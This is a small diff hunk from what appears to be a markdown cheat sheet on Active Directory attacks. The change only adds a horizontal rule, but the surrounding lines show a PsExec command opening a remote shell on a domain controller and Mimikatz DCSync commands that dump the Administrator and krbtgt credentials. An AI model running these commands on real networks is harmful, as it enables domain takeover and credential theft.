@@ -51,6 +51,8 @@ Klist
 PSEXEC to DC - 
 ```.\PsExec.exe \\dc01 cmd.exe```
 
+* * * 
+
 #### DCSync Attack:
 ```lsadump::dcsync /user:Administrator```
 ```lsadump::dcsync /user:domain\krbtgt```
